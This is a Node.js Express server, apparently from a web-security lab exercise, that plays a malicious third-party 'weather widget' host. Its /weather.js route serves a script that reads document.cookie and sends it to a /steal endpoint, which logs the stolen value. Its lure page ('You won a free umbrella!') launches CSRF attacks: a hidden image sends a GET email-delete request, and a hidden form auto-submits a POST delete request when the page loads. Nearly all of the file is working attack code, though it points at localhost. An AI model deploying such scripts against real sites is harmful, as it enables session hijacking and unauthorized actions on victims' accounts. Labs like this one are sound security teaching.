const express = require("express");
const app = express();
const PORT = 5000;

const modeArg = process.argv.find((arg) => arg.includes("--mode"));
const mode = modeArg ? modeArg.split("=")[1] : "normal";

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get("/weather.js", (req, res) => {
  res.type("application/javascript");

  if (mode === "breach1") {
    res.send(`
      const stolenCookie = document.cookie;
      fetch("http://localhost:5000/steal?data=" + encodeURIComponent(stolenCookie));
      console.log("Cookie successfully sent to Attacker Server!");
    `);
  } else {
    res.send(`console.log("Weather Widget: Temperature is 22°C");`);
  }
});

app.get("/steal", (req, res) => {
  console.log("Stolen Cookie:", req.query.data);
  res.send("OK");
});

/*
  TASK 2.1
  Malicious page for CSRF via GET:
  Loads http://localhost:3000/api/emails/delete/1 through a hidden image.
*/
app.get("/weather-promo.html", (req, res) => {
  const usePostAttack = mode === "csrf-post";

  if (usePostAttack) {
    return res.type("html").send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Weather Promo</title>
      </head>
      <body onload="document.getElementById('attack-form').submit()">
        <h1>You won a free umbrella!</h1>
        <p>Claim your reward by staying on this page for a second...</p>

        <form
          id="attack-form"
          action="http://localhost:3000/api/emails/delete"
          method="POST"
          style="display:none;"
        >
          <input type="hidden" name="id" value="1" />
          <input type="hidden" name="_csrf_token" value="guessed-or-fake-token" />
        </form>
      </body>
      </html>
    `);
  }

  res.type("html").send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Weather Promo</title>
    </head>
    <body>
      <h1>You won a free umbrella!</h1>
      <p>Loading your weather bonus...</p>

      <img
        src="http://localhost:3000/api/emails/delete/1"
        alt=""
        width="1"
        height="1"
        style="display:none;"
      />
    </body>
    </html>
  `);
});

app.get("/", (req, res) => {
  res.send(`
    <h2>Weather Server running</h2>
    <p>Mode: <strong>${mode}</strong></p>
    <ul>
      <li><a href="/weather-promo.html">Open weather-promo.html</a></li>
      <li><a href="/weather.js">Open weather.js</a></li>
    </ul>
  `);
});

app.listen(PORT, () => {
  console.log(
    "Weather server running in mode:",
    mode,
    `on http://localhost:${PORT}`,
  );
});
